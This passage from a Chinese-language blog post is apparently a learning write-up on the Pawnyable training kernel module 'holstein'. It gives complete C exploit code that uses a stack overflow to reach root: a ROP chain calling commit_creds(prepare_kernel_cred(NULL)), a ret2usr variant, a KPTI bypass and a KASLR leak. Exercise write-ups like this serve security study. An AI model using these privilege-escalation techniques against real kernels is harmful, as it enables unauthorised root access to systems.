+<h2 id="stack-overflow"><a href="#stack-overflow" class="headerlink" title="stack-overflow"></a>stack-overflow</h2><h3 id="常规rop"><a href="#常规rop" class="headerlink" title="常规rop"></a>常规rop</h3><p><code>commit_creds(prepare_kernel_cred(NULL))</code>提权，<code>no kaslr</code>  <code>no kpti</code>  <code>no smep</code>  <code>no smap</code>，事实上，如果加入<code>smep/smap</code>保护，该exp仍能执行，因为该过程中并未在内核态下执行和访问用户态数据</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//0xffffffff8160c96b : mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> swapgs 0xffffffff8160bf7e</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> iretq 0xffffffff810202af</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mov_rdi_rax_ret 0xffffffff8160c96b</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rcx_ret 0xffffffff812ea083</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prepare_kernel_cred 0xffffffff8106e240</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> commit_creds 0xffffffff8106e390</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rdi 0xffffffff8127bbdc</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* root checker and shell poper */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root_shell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid()) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* to exit the process normally, instead of segmentation fault */</span></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	saveStatus();</span><br><span class="line">	<span class="type">int</span> fd = open(<span class="string">&quot;/dev/holstein&quot;</span>, <span class="number">2</span>);</span><br><span class="line">	<span class="keyword">if</span>(fd == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Module holstein open error!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="type">long</span> rop_chain[<span class="number">0x100</span>];</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0x81</span>; i++)</span><br><span class="line">		rop_chain[i] = <span class="number">0</span>;</span><br><span class="line">	rop_chain[i++] = pop_rdi;</span><br><span class="line">	rop_chain[i++] = <span class="number">0</span>;</span><br><span class="line">	rop_chain[i++] = prepare_kernel_cred;</span><br><span class="line">	rop_chain[i++] = pop_rcx_ret;</span><br><span class="line">	rop_chain[i++] = <span class="number">0</span>;</span><br><span class="line">	rop_chain[i++] = mov_rdi_rax_ret;</span><br><span class="line">	rop_chain[i++] = commit_creds;</span><br><span class="line">	rop_chain[i++] = swapgs;</span><br><span class="line">	rop_chain[i++] = iretq;</span><br><span class="line">	rop_chain[i++] = (<span class="type">long</span>)get_root_shell;</span><br><span class="line">	rop_chain[i++] = user_cs;</span><br><span class="line">	rop_chain[i++] = user_rflags;</span><br><span class="line">	rop_chain[i++] = user_sp;</span><br><span class="line">	rop_chain[i++] = user_ss;</span><br><span class="line">	</span><br><span class="line">	write(fd, rop_chain, <span class="number">0x500</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="ret2usr"><a href="#ret2usr" class="headerlink" title="ret2usr"></a>ret2usr</h3><p>只是把rop中的<code>commit_creds(prepare_kernel_cred(NULL))</code>放到了用户代码中，在加入<code>smep/smap</code>保护后，产生错误。但事实上<code>smap/smep</code>保护是可以绕过的，因为该保护由CR4寄存器控制</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.loli.net/2021/09/07/sYFKuZiUVNIclBp.png"
+                      alt="image.png"
+                ></p>
+<p>如图，只要我们能修改CR4寄存器的第20，21位为0则可以关闭该保护（在该挑战绕过过程中，我发现似乎没有可用的gadget来对cr4寄存器进行修改，因此只好作罢</p>
+<blockquote>
+<p>但如果加入了KPTI保护，那么ret2usr便无法成功，<strong>对于开启了 KPTI 的内核而言，内核页表的用户地址空间无执行权限</strong>，因此当内核尝试执行用户空间代码时，由于对应页顶级表项没有设置可执行位，因此会直接 panic</p>
+</blockquote>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//0xffffffff8160c96b : mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> swapgs 0xffffffff8160bf7e</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> iretq 0xffffffff810202af</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mov_rdi_rax_ret 0xffffffff8160c96b</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rcx_ret 0xffffffff812ea083</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prepare_kernel_cred 0xffffffff8106e240</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> commit_creds 0xffffffff8106e390</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rdi 0xffffffff8127bbdc</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* root checker and shell poper */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root_shell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid()) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* to exit the process normally, instead of segmentation fault */</span></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* for ret2usr attacker */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root_privilige</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *(*prepare_kernel_cred_ptr)(<span class="type">void</span> *) = </span><br><span class="line">                                         (<span class="type">void</span> *(*)(<span class="type">void</span>*)) prepare_kernel_cred;</span><br><span class="line">    <span class="type">int</span> (*commit_creds_ptr)(<span class="type">void</span> *) = (<span class="type">int</span> (*)(<span class="type">void</span>*)) commit_creds;</span><br><span class="line">    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	saveStatus();</span><br><span class="line">	<span class="type">int</span> fd = open(<span class="string">&quot;/dev/holstein&quot;</span>, <span class="number">2</span>);</span><br><span class="line">	<span class="keyword">if</span>(fd == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Module holstein open error!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="type">long</span> rop_chain[<span class="number">0x100</span>];</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0x81</span>; i++)</span><br><span class="line">		rop_chain[i] = <span class="number">0</span>;</span><br><span class="line">	rop_chain[i++] = (<span class="type">long</span>)get_root_privilige;</span><br><span class="line">	rop_chain[i++] = swapgs;</span><br><span class="line">	rop_chain[i++] = iretq;</span><br><span class="line">	rop_chain[i++] = (<span class="type">long</span>)get_root_shell;</span><br><span class="line">	rop_chain[i++] = user_cs;</span><br><span class="line">	rop_chain[i++] = user_rflags;</span><br><span class="line">	rop_chain[i++] = user_sp;</span><br><span class="line">	rop_chain[i++] = user_ss;</span><br><span class="line">	</span><br><span class="line">	write(fd, rop_chain, <span class="number">0x500</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>仅启用KASLR，不使用读取操作来进行ret2usr提权：</strong></p>
+<blockquote>
+<p>当禁用 SMAP、SMEP 和 KPTI 并启用 KASLR 时，仅使用 Stack Overflow 漏洞提升权限（即不使用读取）。<br>提示：使用 ret2usr 执行 shellcode 时检查寄存器值。</p>
+</blockquote>
+<p>略微修改exp为如下即可</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="type">long</span> root_shell = (<span class="type">long</span>)get_root_shell;</span><br><span class="line">...</span><br><span class="line"><span class="type">void</span> <span class="title function_">shellcode</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        __asm__(<span class="string">&quot;push user_ss;&quot;</span></span><br><span class="line">                <span class="string">&quot;push user_sp;&quot;</span></span><br><span class="line">                <span class="string">&quot;push user_rflags;&quot;</span></span><br><span class="line">                <span class="string">&quot;push user_cs;&quot;</span></span><br><span class="line">                <span class="string">&quot;push root_shell;&quot;</span></span><br><span class="line">                <span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">                <span class="string">&quot;iretq;&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="comment">//if with KASLR, use these</span></span><br><span class="line">rop_chain[i++] = (<span class="type">long</span>)get_root_privilige;</span><br><span class="line">rop_chain[i++] = (<span class="type">long</span>)shellcode;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="kernel-rop-with-KPTI-but-without-KASLR"><a href="#kernel-rop-with-KPTI-but-without-KASLR" class="headerlink" title="kernel rop with KPTI but without KASLR"></a>kernel rop with KPTI but without KASLR</h3><p>在开启了kpti之后，再次使用之前的exp就会得到<code>Segmentation fault</code>，只需细微修改exp即可，如</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//if with kpti, then use these</span></span><br><span class="line">rop_chain[i++] = swapgs_restore_regs_and_return_to_usermode+<span class="number">0x16</span>;</span><br><span class="line">rop_chain[i++] = <span class="number">0</span>;</span><br><span class="line">rop_chain[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//if without kpti, then use these</span></span><br><span class="line"><span class="comment">//rop_chain[i++] = swapgs;</span></span><br><span class="line"><span class="comment">//rop_chain[i++] = iretq;</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="add-KASLR"><a href="#add-KASLR" class="headerlink" title="add KASLR"></a>add KASLR</h3><p>在添加了KASLR后，程序在每次启动时都会有一个随机的偏移，但是由于存在越界读取，因此可以读取出内核栈空间的敏感内容，计算得到偏移，如下</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> buf[<span class="number">0x100</span>];</span><br><span class="line">read(fd, buf, <span class="number">0x500</span>);</span><br><span class="line"><span class="type">long</span> offset = buf[<span class="number">0x81</span>] - ret_addr_no_aslr;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;KASLR offset is : %p\n&quot;</span>, offset);</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>在调试KASLR的过程中，出现了如下问题：未开启KASLR时的对应gadget和开启KASLR时的gadget会有可能不一样，引起该问题的主要原因是ROPgadget，ropper等工具在查找gadget时是按照机器码查找的，当文件中出现绝对地址时，而此gadget的机器码正好包含在绝对地址中。</p>
+<p>如：绝对地址<code>0xFFFFFFFF81C35900</code>，而<code>pop rcx; ret</code>对应的机器码是<code>59 C3</code>，正好是这个绝对地址中的部分值，因此在没有KASLR的情况下，它确实是一个有效的gadget。然而，一旦KASLR生效，它同时也将内核中这些汇编指令中的绝对地址也做了更新，否则内核在执行类似上面这条mov指令时就可能会出错，因为地址已经被随机化了。</p>
+</blockquote>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Pawnable笔记（一）之 Kernel ROP</li>
+        <li><strong>Author:</strong> Static</li>
+        <li><strong>Created at
+                :</strong> 2024-01-23 15:51:53</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2023-11-20 22:54:24
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://staticccccccc.github.io/2024/01/23/Pawnyable(1) - Kernel ROP/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2024/01/23/Pawnyable(2)%20-%20Heap%20Overflow/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Pawnable笔记（二）之 Heap Overflow</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/01/23/kernel%E5%85%A5%E9%97%A8(2)%E4%B9%8Bret2dir/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">kernel入门(2)之ret2dir</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          recaptchaV3Key: "wasd",
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Pawnable笔记（一）之 Kernel ROP</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%F0%9F%90%BEWhat%E2%80%99s-Pawnyable-%F0%9F%90%BE"><span class="nav-text">🐾What’s Pawnyable?🐾</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A1%AE%E4%BF%9D%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%AD%A3%E5%B8%B8%E5%90%AF%E5%8A%A8"><span class="nav-text">确保文件系统正常启动</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E5%85%B7%E6%9C%89-root-%E6%9D%83%E9%99%90"><span class="nav-text">使具有 root 权限</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AF%94%E8%BE%83commit-creds%E5%87%BD%E6%95%B0%E7%9A%84rdi"><span class="nav-text">比较commit_creds函数的rdi</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#root%E7%94%A8%E6%88%B7"><span class="nav-text">root用户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%EF%BC%88uid-1337"><span class="nav-text">普通用户（uid&#x3D;1337</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6"><span class="nav-text">安全机制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%A1%E5%9D%97%E6%BC%8F%E6%B4%9E%E4%B8%8E%E8%A7%A6%E5%8F%91"><span class="nav-text">模块漏洞与触发</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%AE%80%E5%8D%95%E8%A7%A6%E5%8F%91POC"><span class="nav-text">栈溢出漏洞的简单触发POC</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stack-overflow"><span class="nav-text">stack-overflow</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%84rop"><span class="nav-text">常规rop</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2usr"><span class="nav-text">ret2usr</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#kernel-rop-with-KPTI-but-without-KASLR"><span class="nav-text">kernel rop with KPTI but without KASLR</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#add-KASLR"><span class="nav-text">add KASLR</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Static</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.0</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
